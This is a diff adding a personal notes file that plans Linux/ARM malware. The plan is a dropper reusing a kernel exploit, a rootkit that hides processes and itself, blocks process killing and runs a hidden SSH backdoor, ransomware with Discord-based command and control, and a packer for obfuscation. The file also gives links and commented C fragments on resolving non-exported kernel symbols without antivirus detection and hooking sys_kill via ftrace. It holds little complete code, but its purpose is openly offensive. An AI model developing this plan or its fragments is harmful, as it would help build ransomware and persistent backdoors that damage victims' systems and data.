@@ -1,0 +1,41 @@
+okay lets make this shit happen
+
+first things first
+dropper: repurpose a linux kernel exploit POC
+
+rk: hide from process list and prevent process from being killed
+start and hide ssh server as persistent backdoor
+hide itself from kernel log and module list
+
+ransomware itself
+
+- discord based c2
+
+finally, some sort of obfuscation it does not have to be too complicated
+  - need to write some sort of packer for arm
+
+remember arm is weird so sudo -s works but sudo doesnt
+
+// https://nskernel.gitbook.io/kernel-play-guide/accessing-the-non-exported-in-modules
+
+since ``kallsyms_lookup_name`` isnt exported anymore and ``kprobe`` is detected by AVs, this could be adapted to a pretty cool method to resolve non exported kernel symbols without disabling KASLR
+
+https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/
+
+
+implement r0memdump into rk
+as well as container escapes
+
+prefix: __arm64_
+
+// long unsigned int (**)(const char *) tmp = kallsyms_lookup_name_;
+// tmp = (long unsigned int (*)(const char *)) kp.addr;
+
+// kallsyms_lookup_name_ = (long unsigned int (*)(const char *)) kp.addr;
+
+
+// hook = kmalloc(sizeof(ftrace_hook), GFP_KERNEL);
+// if (!hook) {
+//     return -ENOENT;
+// }
+// hook = {"sys_kill", hook_kill, &orig_kill, NULL, {NULL, NULL, NULL}};
